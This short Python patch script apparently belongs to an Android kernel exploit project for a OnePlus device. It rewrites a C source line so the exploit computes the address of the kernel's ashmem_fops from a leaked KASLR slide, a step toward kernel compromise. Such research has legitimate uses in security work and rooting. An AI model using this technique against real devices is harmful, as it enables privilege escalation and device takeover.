F="/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s=open(F).read()
assert "kaslr_fops_alias = (kaslr_slide" not in s
old="  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);"
new=("  /* Known slide -> real ashmem_fops via canonical image mapping.\n"
     "   * data_addr's linear alias needs an unknown phys delta (BAN_GIAO 22.2). */\n"
     "  kaslr_fops_alias = (kaslr_slide != 0) ? canon_addr(ASHMEM_FOPS)\n"
     "                                        : p0_data_alias(ASHMEM_FOPS);")
assert s.count(old)==1, s.count(old)
s=s.replace(old,new,1)
open(F,"w").write(s)
print("fops.c: leak_kernel_base canon when slid")
